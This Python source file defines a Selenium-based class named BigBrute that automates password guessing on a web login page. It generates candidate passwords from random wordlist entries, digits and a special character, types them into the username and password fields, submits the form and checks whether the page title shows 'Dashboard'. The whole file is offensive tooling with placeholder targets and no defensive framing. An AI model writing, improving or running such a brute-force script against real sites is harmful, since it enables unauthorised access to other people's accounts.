from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import linecache


class BigBrute:

    def __init__(self):
        self.browser = webdriver.Chrome('path to chromedriver')

    # use browser to open website
    def open_website(self):
        self.browser.get('website page to brute')

    # get the username field
    # if by_name False then use xpath
    def get_username_field(self, username_element, by_name=True):
        if by_name:
            username_element = self.browser.find_element_by_name(username_element)  # can be email
            return username_element  
        elif not by_name:
            username_element = self.browser.find_element_by_xpath(username_element)  # can be email
            return username_element
        else:
            return 'can\'t be determined'

    # get the pwd field
    # if by_name False then use xpath
    def get_pwd_field(self, pwd_element, by_name=True):
        if by_name:
            pwd_element = self.browser.find_element_by_name(pwd_element)
            return pwd_element 
        elif not by_name:
            pwd_element = self.browser.find_element_by_xpath(pwd_element)
            return pwd_element
        else:
            return 'can\'t be determined'

    # checks success of brute by checking if the page title changed
    def brute_success(self):
        page_title = self.browser.title
        if 'Dashboard' not in page_title:
            return False
        else:
            return True

    # closes browser
    def close_browser(self):
        self.browser.quit()

    # gets word from a file
    def get_word(self, num_range, word_list):
        my_range = random.randint(1, num_range)
        my_word = linecache.getline(word_list, my_range)  # gets word from random line in file within range
        return my_word

    # pwd generator
    def pwd_generator(self):
        p_list = []
        first_word = self.get_word(10000, 'file.txt')
        second_word = self.get_word(20000, 'file.txt')
        special_chars = '$#@%&!*'
        p_digits = random.randint(0, 2020)
        p_list.append(first_word.rstrip().capitalize())
        p_list.append(second_word.rstrip().capitalize())
        p_list.append(str(p_digits))
        p_list.append(random.choice(special_chars))
        random.shuffle(p_list)
        pwd_phrase = ''.join(p_list)
        return pwd_phrase  # 2 words, a special character, and number

    # runs the brute force attack
    def big_brute(self):
        username_field = self.get_username_field('username field name or xpath', by_name=True)
        pwd_field = self.get_pwd_field('pwd field name or xpath', by_name=True)
        login_btn = self.browser.find_element_by_name('login button name')

        pwd_to_use = self.pwd_generator()

        username_field.send_keys('email to use')
        pwd_field.send_keys(pwd_to_use)
        login_btn.send_keys(Keys.ENTER)
